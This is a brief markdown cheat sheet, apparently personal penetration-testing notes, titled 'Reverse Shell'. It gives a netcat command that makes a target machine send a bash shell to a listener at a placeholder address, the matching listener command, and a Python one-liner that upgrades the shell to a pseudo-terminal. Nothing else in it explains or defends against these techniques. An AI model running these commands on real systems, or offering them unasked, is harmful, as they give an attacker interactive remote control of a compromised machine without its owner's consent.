# Reverse Shell


### Netcat
remote: `nc -e /bin/bash <local-ip> <local-port>`  
local: `nc -lvp <local-port>`

## Upgrading the connection

### Python Pseudo-Terminal
`python -c 'import pty; pty.spawn("/bin/bash")`
